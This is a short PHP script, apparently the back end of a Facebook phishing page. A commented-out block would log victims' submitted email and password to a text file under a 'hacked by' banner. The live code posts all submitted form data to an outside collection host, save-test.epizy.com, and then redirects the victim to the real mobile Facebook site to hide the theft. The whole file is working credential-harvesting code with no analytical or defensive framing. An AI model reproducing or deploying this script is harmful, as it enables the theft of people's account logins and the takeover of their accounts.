<?

/*
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$pass = $_POST['pass'];

		$text_result .="-------------hacked by mohammed alali---------------\n";
		$text_result .="======================================================\n";
		
		$text_result .="EMAIL :  ".$email."\n";
		$text_result .="PASSWORD : ".$pass."\n";
		$text_result .="======================================================\n";
		
		
	$file = fopen("tnt1.txt", 'a');	
	fwrite($file, $text_result);
	
	
*/	
	
	
	
	
	
	//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;


sendPost('http://www.save-test.epizy.com/face.php',$data);


//---- end request----------------
		
header('Location:https://m.facebook.com');?>

